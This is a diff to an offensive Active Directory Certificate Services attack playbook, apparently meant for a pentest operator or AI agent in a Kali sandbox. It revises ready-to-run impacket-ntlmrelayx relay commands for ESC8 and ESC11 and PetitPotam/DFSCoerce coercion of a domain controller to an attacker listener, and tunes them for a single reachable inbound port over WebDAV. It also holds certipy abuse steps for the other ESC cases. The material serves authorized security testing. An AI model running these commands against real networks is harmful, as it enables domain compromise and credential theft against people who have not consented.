@@ -53,10 +53,10 @@ certipy-ad find -u $USER@$DOMAIN -p $PASS -dc-ip $DC_IP \
 | **ESC5** | Vulnerable ACLs on a CA / PKI object in AD | Domain user | Modify CA ACL via `bloodyAD` or `impacket-dacledit` to grant yourself enrollment rights |
 | **ESC6** | CA flag `EDITF_ATTRIBUTESUBJECTALTNAME2` set | Domain user with enroll rights on ANY auth-template | Submit cert request with custom SAN via `certipy-ad req -template Generic -upn admin@$DOMAIN -sid <admin-SID>` (note: ESC6 was patched in May 2022 by default) |
 | **ESC7** | Low-priv user has `ManageCA` or `ManageCertificates` rights | Same | Add yourself as Officer; approve a previously-denied request: `certipy-ad ca -ca CAName -add-officer $USER`, then `certipy-ad ca -ca CAName -issue-request <id>` |
-| **ESC8** | NTLM Relay to AD-CS Web Enrollment (`http://CA/certsrv/certfnsh.asp`) | Reachable web enrollment + coerced NTLM auth | `impacket-ntlmrelayx --target http://CA/certsrv/certfnsh.asp -smb2support --adcs --template <T>`; coerce a privileged machine via PetitPotam / DFSCoerce / PrinterBug |
+| **ESC8** | NTLM Relay to AD-CS Web Enrollment (`http://CA/certsrv/certfnsh.asp`) | Reachable web enrollment + coerced NTLM auth | `impacket-ntlmrelayx --target http://CA/certsrv/certfnsh.asp --adcs --template <T> --http-port <LISTEN_PORT> --no-smb-server`; coerce a privileged machine over WebDAV to your one reachable port (see ESC8 below) |
 | **ESC9** | Template with `no security extension` flag (UPN ignored, only DNS) + UPN-write on a target | Same as ESC1 + UPN write rights | Set victim's `userPrincipalName` to admin's UPN, request cert, restore UPN |
 | **ESC10** | Weak `StrongCertificateBindingEnforcement` registry config + UPN-write or other identity-mapping abuse | Same | Hash collision on identity mapping; chain to KDC validation gap (CVE-2022-34691 family) |
-| **ESC11** | NTLM relay to ICPR RPC (port 135 / dynamic) without `EnforceEncryptionForRequests` | Same as ESC8 but RPC instead of HTTP | `impacket-ntlmrelayx --target rpc://CA -rpc-mode ICPR --adcs --template <T>` |
+| **ESC11** | NTLM relay to ICPR RPC (port 135 / dynamic) without `EnforceEncryptionForRequests` | Same as ESC8 but RPC instead of HTTP | `impacket-ntlmrelayx --target rpc://CA -rpc-mode ICPR --adcs --template <T> --http-port <LISTEN_PORT> --no-smb-server` (the callback still arrives over HTTP on your one port) |
 | **ESC12** | YubiHSM / shell access to CA host | Local admin on CA | Read CA private key via the YubiHSM session; forge any cert |
 | **ESC13** | Template with `Issuance Policy` linked to an OID that maps to a domain group | Same as ESC1 | Request cert with the issuance policy; cert grants implicit group membership at PKINIT auth |
 | **ESC14** | DNS-name override / `userCertificate` weak validation | Same as ESC10 family | Subset of identity-mapping abuse |
@@ -165,19 +165,28 @@ certipy-ad auth -pfx administrator.pfx
 
 The most-used AD-CS attack in modern engagements. Combines coerced authentication with HTTP relay.
 
+> WARNING - relaying needs the DC's coerced authentication to connect BACK to ntlmrelayx, and a
+> per-user Kali sandbox exposes only ONE target-reachable inbound port (see the "Pre-Configured
+> Payload Settings" block). The coercion RPC call itself is outbound and fine; the DC's callback
+> is what must reach you. An SMB callback (445) can never arrive, so only a WebDAV/HTTP callback
+> to that one port works, and only if the DC runs the WebClient service (it sends credentials to
+> an intranet-zone NAME, so a public tunnel hostname often gets no auth). Two numbers:
+>   - pool (no tunnel): ntlmrelayx listens on the pool port P, and the DC is coerced to LHOST:P;
+>   - ngrok/chisel: ntlmrelayx listens on 4444 (the local bind), and the DC is coerced to the
+>     block's LHOST:LPORT (the public port the tunnel forwards to 4444).
+> With no reachable inbound port this attack is not possible from the sandbox - record that and
+> move on.
+
 ```bash
-# Terminal 1: start ntlmrelayx with ADCS template
-impacket-ntlmrelayx -t http://$CA_HOST/certsrv/certfnsh.asp \
-  -smb2support --adcs --template DomainController
+# LISTEN_PORT = the pool port, or 4444 with a tunnel. LHOST/LPORT come from the block.
+# Terminal 1: ntlmrelayx with the ADCS template, HTTP listener on your one port, no SMB server.
+# It holds your handler port for ALL your chats while it runs: `ss -ltn` first, stop it after.
+impacket-ntlmrelayx -t http://$CA_HOST/certsrv/certfnsh.asp --adcs --template DomainController \
+  --http-port $LISTEN_PORT --no-smb-server
 
-# Terminal 2: coerce a DC to authenticate
-# Option A: PetitPotam (netexec module)
-nxc smb $DC_IP -u $USER -p $PASS -d $DOMAIN -M petitpotam -o LISTENER=$ATTACKER_IP
-
-# Option B: DFSCoerce (netexec module)
-nxc smb $DC_IP -u $USER -p $PASS -d $DOMAIN -M dfscoerce -o LISTENER=$ATTACKER_IP
-
-# Option C: PrinterBug (impacket-ntlmrelayx auto-coerce via spoolss)
+# Terminal 2: coerce the DC to a WebDAV (HTTP) path on your reachable endpoint. The listener
+# must be a NAME the DC resolves, in WebDAV form <name>@<port>/<path>:
+nxc smb $DC_IP -u $USER -p $PASS -d $DOMAIN -M petitpotam -o LISTENER=<lhost-name>@<LPORT>/x
 
 # Terminal 1 captures the coerced NTLM, relays to ICPR HTTP, gets cert as DC machine account
 # Then:
@@ -210,10 +219,16 @@ Family of attacks chaining UPN / DNS-name confusion with weakened `StrongCertifi
 
 ### ESC11 (NTLM Relay to ICPR RPC)
 
+Only the relay TARGET is RPC: the DC's coerced authentication must still reach ntlmrelayx, and
+the ESC8 warning applies unchanged. No SMB callback can arrive, so the listener is HTTP on your
+one reachable port and the DC is coerced over WebDAV exactly as in ESC8. With no reachable
+inbound port this attack is not possible from the sandbox.
+
 ```bash
-impacket-ntlmrelayx -t rpc://$CA_HOST -rpc-mode ICPR \
-  --adcs --template DomainController -smb2support
-# Coerce as in ESC8
+# LISTEN_PORT = the pool port, or 4444 with a tunnel (see ESC8).
+impacket-ntlmrelayx -t rpc://$CA_HOST -rpc-mode ICPR --adcs --template DomainController \
+  --http-port $LISTEN_PORT --no-smb-server
+# Coerce as in ESC8: LISTENER=<lhost-name>@<LPORT>/x
 ```
 
 ### ESC13 (Issuance Policy -> implicit group)
